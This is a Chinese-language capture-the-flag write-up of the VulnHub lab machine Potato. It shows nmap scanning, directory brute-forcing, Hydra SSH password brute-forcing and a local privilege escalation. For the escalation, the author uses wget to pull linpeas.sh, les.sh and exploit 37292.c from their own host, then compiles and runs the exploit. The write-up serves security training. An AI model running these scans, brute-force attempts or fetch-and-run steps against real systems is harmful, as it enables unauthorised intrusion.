## 复盘*

## 靶机地址：

[Potato (SunCSR): 1 ~ VulnHub](https://www.vulnhub.com/entry/potato-suncsr-1,556/)

![image-20250313104914723](assets/image-20250313104914723.png)



## 信息收集



### 准备阶段

创建nmapscan文件夹，用于存放扫描结果

```
mkdir nmapscan
```

![image-20250313105022106](assets/image-20250313105022106.png)

### namp扫描

#### 主机探活

```
nmap -sn 192.168.147.0/24
```

![image-20250313105004343](assets/image-20250313105004343.png)

确定靶机ip：

192.168.147.134



#### 主机端口扫描

```
sudo nmap -sT --min-rate 10000 -p- 192.168.147.134 -oA nmapscan/ports
```

![image-20250313105213677](assets/image-20250313105213677.png)

开放了：

- 80 http服务
- 7120 未知服务



#### 提取端口号

```
ports=$(cat nmapscan/ports.nmap | grep open | awk -F/ '{print $1}' | paste -sd,)
echo $port
```

![image-20250313105331358](assets/image-20250313105331358.png)



#### 详细结果扫描

```
sudo nmap -sC -sT -p 80,7120 -sV -O 192.168.147.134 -oA nmapscan/detail
```

![image-20250313105517757](assets/image-20250313105517757.png)

分析：

- 80端口
  - http服务，Apache httpd 2.4.7
  - Ubuntu系统
  - http标题为potato
- 7120端口
  - ssh服务
  - OpenSSH 6.6



#### UDP扫描

```
sudo nmap -sU --top-port 20 192.168.147.134 -oA nmapscan/udp
```

![image-20250313105634962](assets/image-20250313105634962.png)

无结果



### 80 端口

#### 访问192.168.147.134

![image-20250313105651777](assets/image-20250313105651777.png)

只有一个土豆



#### 下载图片

```
wget http://192.168.147.134/potato.jpg
ls
```

![image-20250313110006231](assets/image-20250313110006231.png)

![image-20250313110040635](assets/image-20250313110040635.png)



#### steghide检测是否有隐写数据

```
sudo steghide info potato.jpg
```

![image-20250313110048500](assets/image-20250313110048500.png)

无数据



#### binwalk检测

```
sudo binwalk potato.jpg
```

![image-20250313110742230](assets/image-20250313110742230.png)

无数据



#### 查看页面源码

![image-20250313110827427](assets/image-20250313110827427.png)

无关键信息



#### dirsearch进行目录扫描

```
sudo dirsearch -u 192.168.147.134
```

![image-20250313111221941](assets/image-20250313111221941.png)

只有一个info.php



#### gobuster进行目录扫描

```
sudo gobuster dir -u http://192.168.147.134/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html.js,css
```

![image-20250313111417868](assets/image-20250313111417868.png)

同样只有一个info.php



#### 访问info.php

![image-20250313111511419](assets/image-20250313111511419.png)

phpinfo界面，php版本为5.5.9



#### 搜索相关漏洞

![image-20250313111935559](assets/image-20250313111935559.png)

只有一个

通过修改内存来绕过disable_functions限制





#### 80端口总结

- php版本信息5.5.9
- Ubuntu系统
- 敏感字段信息只有标题tomato
- 此外无上传，注入点





### 7120 端口

#### 提取标题字段制作字典



![image-20250313112158970](assets/image-20250313112158970.png)



#### hydra爆破ssh服务

```
hydra -L user.txt -P passwd.txt ssh://192.168.147.134:7120
```

![image-20250313112253577](assets/image-20250313112253577.png)



#### 更换密码字典

```
hydra -L user.txt -P /usr/share/john/password.lst ssh://192.168.147.134:7120
```

![image-20250313112401510](assets/image-20250313112401510.png)





#### ssh登录

```
ssh potato@192.168.147.134 -p 7120
```

![image-20250313112422307](assets/image-20250313112422307.png)



成功



### 提权

#### 尝试sudo提取

![image-20250313112453442](assets/image-20250313112453442.png)

提示没有sudo命令



#### 查看用户信息

```
cat /etc/passwd
```

![image-20250313112540729](assets/image-20250313112540729.png)

可用的只有root和potato用户





#### 上传linpeas.sh

```
wget 192.168.147.131/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![image-20250313112711325](assets/image-20250313112711325.png)

![image-20250313112906319](assets/image-20250313112906319.png)

无敏感文件



#### 上传les.sh

```
wget 192.168.147.131/les.sh
chmod +x les.sh
./les
```

![image-20250313113023208](assets/image-20250313113023208.png)

ubuntu 14.04



#### 搜索相关提权漏洞

```
sudo searchsploit ubuntu 14.04
```

![image-20250313113431022](assets/image-20250313113431022.png)



![image-20250313113922760](assets/image-20250313113922760.png)



五个可用的exp（可以挨个尝试，我这里时37292.c可用）



#### 上传37292.c

```
wget 192.168.147.131/37292.c
```

![image-20250313114552165](assets/image-20250313114552165.png)

#### 编译

```
gcc 37292.c -o 3
```

![image-20250313114618695](assets/image-20250313114618695.png)

#### 执行

```
./3
```

![image-20250313114624809](assets/image-20250313114624809.png)



#### 得到flag

![image-20250313114701570](assets/image-20250313114701570.png)